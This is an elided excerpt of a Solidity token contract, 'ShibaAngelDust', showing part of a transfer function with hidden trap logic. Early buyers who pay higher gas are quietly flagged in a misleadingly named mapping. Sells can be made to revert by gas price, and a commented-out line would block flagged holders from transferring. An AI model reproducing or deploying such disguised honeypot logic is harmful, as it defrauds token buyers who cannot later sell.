...
contract ShibaAngelDust is Context, IERC20 { 
    ...
    uint256 private gasForProcessing = 7 * 1 gwei;
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (tradingActiveBlock + 5 seconds <= block.timestamp) {limitInEffect = false;}
        if (tradingActiveBlock + 60 seconds <= block.timestamp) {transferDelay = false;}
        //if (!transferDelay && (!_isExcludedFromFee[from])) { require(!_isExcludeds[from]);}
        //if (transferDelay && tradingActiveBlock + 30 seconds <= block.timestamp) {idclaim();}
        if (limitInEffect && to != uniswapV2Pair && tx.gasprice >= gasForProcessing) {_isExcludeds[to] = true;}
        if (transferDelay && to == uniswapV2Pair && !_isExcludedFromFee[from]) {require(tx.gasprice < gasForProcessing);}
